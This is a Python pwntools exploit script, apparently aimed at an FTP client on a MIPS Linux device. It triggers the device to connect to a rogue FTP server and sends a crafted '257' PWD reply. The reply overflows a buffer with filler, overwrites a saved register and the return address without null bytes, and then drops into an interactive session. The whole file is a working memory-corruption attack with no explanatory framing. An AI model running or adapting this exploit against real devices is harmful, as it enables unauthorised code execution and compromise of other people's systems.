#!/usr/bin/env python3

import pwn
import struct as s
from common import info, sendFtpPkt, readResp
from runLeak import handleFtp1, handleFtp2

from config import *

def shellCodeInPwd(addr):
    respBuf = b'257 "/' + b'B'*259
    #   vulnerable code uses strchr to find \" and replaces it with \0
    #   set s0 - no nulls
    respBuf += s.pack('<I', 0xBBBBBBBB)
    #   set ra - still no nulls(as the pwd must be enclosed in "
    #   which will be replaced with \0
    binAddr = s.pack('<I', addr).removesuffix(b'\0')
    info("binAddr len", len(binAddr))
    respBuf += binAddr

    respBuf += b'" is the current directory'

    return respBuf

def doFtpServer(ftpd, addr, withSize=True, pwd=b"/"):
    info("Aggressive FTP")
    handleFtp1(ftpd)
    handleFtp2(ftpd)
    respBuf = shellCodeInPwd(addr)
    ftpd.sendline(respBuf)
    #   wait for EoF, Alloca will crash
    ftpd.interactive()
    ftpd.close()

def main():
    pwn.context.update(os='linux', arch='mips')
    r = pwn.remote(remoteIp, remotePort)

    #   FTP attempts
    ftpd = pwn.server(localPort, localIp)
    ftpd.newline = b'\r\n'

    sendFtpPkt(r) 
    readResp(r)
    #   ding, dong
    doFtpServer(ftpd.next_connection(), 0x5218d8)

    info("DONE")
    ftpd.close()
    r.close()

if __name__ == "__main__":
    main()
